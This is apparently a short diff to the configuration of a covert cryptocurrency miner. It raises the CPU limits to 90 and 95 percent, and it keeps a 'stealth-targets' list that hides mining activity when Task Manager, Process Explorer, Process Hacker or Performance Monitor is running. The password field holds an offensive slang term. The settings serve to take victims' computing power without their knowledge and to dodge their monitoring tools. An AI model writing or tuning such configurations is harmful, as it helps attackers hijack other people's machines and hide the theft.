@@ -6,9 +6,9 @@
     "password": "newfag",
     "nicehash": false,
     "ssltls": true,
-    "max-cpu": 55,
+    "max-cpu": 90,
     "idle-wait": 5,
-    "idle-cpu": 90,
+    "idle-cpu": 95,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
     "kill-targets": "",
     "stealth-fullscreen": false
